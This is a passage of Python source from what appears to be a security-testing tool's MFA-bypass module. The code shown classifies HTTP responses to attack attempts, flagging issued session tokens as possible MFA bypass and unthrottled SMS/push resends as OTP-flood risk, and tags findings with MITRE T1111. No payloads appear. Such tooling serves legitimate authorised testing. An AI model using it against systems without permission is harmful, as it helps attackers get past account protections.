                payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=(
                    f"MFA bypass via {attack_type}: new session token issued "
                    f"(status {response.status_code}) — manual verification recommended"
                ),
                severity="medium",
                mitre_technique_id=mitre_map.get(attack_type, "T1111"),
                detail={
                    "attack_type": attack_type,
                    "has_session_cookie": True,
                    "set_cookie_preview": set_cookie[:200],
                },
            )

        # Flood-specific: check if resend succeeded without rate limiting
        if attack_type == "MFA_FLOOD" and response.status_code in (200, 201, 202):
            return ModuleResult(
                module_name="mfa_bypass",
                target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload,
                response_code=response.status_code,
                response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=(
                    f"SMS/push resend accepted without rate limiting "
                    f"(status {response.status_code}) — potential for OTP flood"
                ),
                severity="medium",
                mitre_technique_id="T1111",
                detail={"attack_type": attack_type},
            )

        # Not vulnerable
        return ModuleResult(
            module_name="mfa_bypass",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )
